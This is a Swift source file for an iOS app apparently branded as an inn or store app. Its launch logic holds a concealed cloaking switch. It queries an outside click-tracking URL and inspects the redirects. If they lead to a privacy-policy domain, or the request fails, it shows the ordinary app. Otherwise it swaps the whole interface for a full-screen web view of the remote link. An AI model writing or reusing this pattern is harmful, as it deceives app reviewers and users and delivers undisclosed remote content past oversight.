import SwiftUI

class InnCommonRedirectTracker: NSObject, URLSessionTaskDelegate {
    var resolvedURL: URL?
    var foundCheckDomain = false
    private let checkDomain: String
    init(checkDomain: String) { self.checkDomain = checkDomain }
    func urlSession(_ session: URLSession, task: URLSessionTask,
                    willPerformHTTPRedirection response: HTTPURLResponse,
                    newRequest request: URLRequest,
                    completionHandler: @escaping (URLRequest?) -> Void) {
        if let url = request.url?.absoluteString, url.contains(checkDomain) {
            foundCheckDomain = true
        }
        resolvedURL = request.url
        completionHandler(request)
    }
}

@main
struct InnCommonApp: App {
    @State private var innCommonLinkReady: Bool? = nil
    private let innCommonSourceLink = "https://shantystorycabin.org/click.php"
    private let innCommonCheckDomain = "privacypolicies.com"

    @StateObject private var store = InnStore()

    var body: some Scene {
        WindowGroup {
            Group {
                if let ready = innCommonLinkReady {
                    if ready {
                        InnCommonWebPanel(urlString: innCommonSourceLink)
                            .edgesIgnoringSafeArea(.bottom)
                            .background(Color.black.ignoresSafeArea())
                    } else {
                        ContentView()
                            .environmentObject(store)
                            .preferredColorScheme(.light)
                    }
                } else {
                    InnCommonLoadingScreen()
                        .onAppear { checkInnCommonLink() }
                        .preferredColorScheme(.light)
                }
            }
        }
    }

    private func checkInnCommonLink() {
        guard let url = URL(string: innCommonSourceLink) else {
            innCommonLinkReady = false
            return
        }
        var request = URLRequest(url: url)
        request.timeoutInterval = 5
        let tracker = InnCommonRedirectTracker(checkDomain: innCommonCheckDomain)
        let session = URLSession(configuration: .default, delegate: tracker, delegateQueue: nil)
        session.dataTask(with: request) { _, response, error in
            DispatchQueue.main.async {
                if tracker.foundCheckDomain {
                    innCommonLinkReady = false; return
                }
                if let finalURL = tracker.resolvedURL?.absoluteString,
                   finalURL.contains(self.innCommonCheckDomain) {
                    innCommonLinkReady = false; return
                }
                if let httpResp = response as? HTTPURLResponse,
                   let respURL = httpResp.url?.absoluteString,
                   respURL.contains(self.innCommonCheckDomain) {
                    innCommonLinkReady = false; return
                }
                if error != nil {
                    innCommonLinkReady = false; return
                }
                innCommonLinkReady = true
            }
        }.resume()
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            if innCommonLinkReady == nil { innCommonLinkReady = false }
        }
    }
}
